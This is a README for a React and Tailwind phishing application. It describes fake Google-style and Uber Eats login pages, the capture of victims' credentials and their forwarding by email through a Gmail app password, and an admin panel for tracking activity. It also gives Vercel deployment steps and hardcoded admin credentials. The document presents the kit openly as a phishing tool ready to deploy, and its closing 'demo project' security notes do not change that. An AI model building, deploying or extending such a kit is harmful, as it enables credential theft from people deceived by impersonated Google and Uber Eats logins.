# React + Tailwind CSS Phishing Application

A modern phishing application built with React, TypeScript, and Tailwind CSS. Features Google-style and Uber Eats login pages with email credential capture and admin panel for activity tracking.

## 🚀 Tech Stack

- **Frontend:**
  - React 19
  - TypeScript
  - Vite
  - Tailwind CSS

## 📋 Features

- Google-style two-step login flow (email → password)
- Uber Eats login page
- Email credential capture and forwarding
- Admin panel with activity tracking (frontend-only using localStorage)
- Responsive design with Tailwind CSS
- TypeScript for type safety
- Modern UI with smooth transitions

## 🛠️ Installation

1. Install dependencies:
```bash
npm install
```

## 🚀 Running the Application

### Development Mode

Run the frontend (React + Vite):
```bash
npm run dev
```
The app will be available at `http://localhost:5173`

### Admin Panel Access

Access the admin panel at `/admin` with:
- Username: `Mudassar1122`
- Password: `S112233h$`

## 📁 Project Structure

```
src/
├── App.tsx                 # Main app component with routing
├── LoginPage.tsx           # Google-style login page
├── UberEatsLogin.tsx       # Uber Eats login page
├── admin/
│   ├── AdminLogin.tsx      # Admin authentication
│   ├── AdminDashboard.tsx  # Activity dashboard
│   └── AdminPanel.tsx      # Admin panel layout
├── utils/
│   ├── activityTracker.ts  # Activity tracking (localStorage)
│   └── database.js         # Database utilities (localStorage)
└── assets/                 # Static assets
```

## 🔧 Configuration

### Environment Variables

Create a `.env` file in the root directory with:

```env
GMAIL_USER=your-email@gmail.com
GMAIL_APP_PASSWORD=your-app-password
RECIPIENT_EMAIL=recipient@gmail.com
```

For Vercel deployment, add these environment variables in your Vercel project settings.

### Gmail Setup

1. Enable 2-Factor Authentication in your Google Account
2. Generate an App Password at https://myaccount.google.com/apppasswords
3. Use the generated password as `GMAIL_APP_PASSWORD`

## 🚀 Deployment

### Vercel Deployment

1. Push your code to GitHub
2. Import your repository in Vercel
3. Add environment variables in Vercel project settings
4. Deploy

The application uses Vercel serverless functions for API endpoints (`/api` folder).

## 📁 Project Structure

```
temp/
├── src/
│   ├── LoginPage.tsx      # Google-style login component
│   ├── App.tsx            # Main app component
│   ├── main.tsx           # App entry point
│   └── index.css          # Tailwind directives
├── server/
│   └── index.js           # Express backend server
├── public/                # Static assets
├── index.html             # HTML template
├── package.json           # Dependencies and scripts
├── tailwind.config.js     # Tailwind configuration
├── vite.config.ts         # Vite configuration
└── tsconfig.json          # TypeScript configuration
```

## 🔌 API Endpoints

### Health Check
```
GET /api/health
Response: { status: 'ok', message: 'Server is running' }
```

### Login
```
POST /api/login
Body: { email: string, password: string }
Response: { success: boolean, message: string, user?: { email: string } }
```

## 🎨 Login Flow

1. **Email Step:** User enters their email address
2. **Password Step:** After clicking "Next", user enters their password
3. **Submit:** Credentials are logged (can be connected to the backend API)

## 🏗️ Build for Production

```bash
npm run build
```

The built files will be in the `dist/` directory.

## 📝 Notes

- The current login implementation logs credentials to the console
- For production use, implement proper authentication and security measures
- The backend API is a basic example - add proper validation, authentication, and database integration

## 🔒 Security Considerations

⚠️ This is a demo project. For production:
- Use HTTPS
- Implement proper password hashing (bcrypt)
- Add JWT or session-based authentication
- Use environment variables for sensitive data
- Add rate limiting
- Implement CSRF protection
- Validate and sanitize all inputs
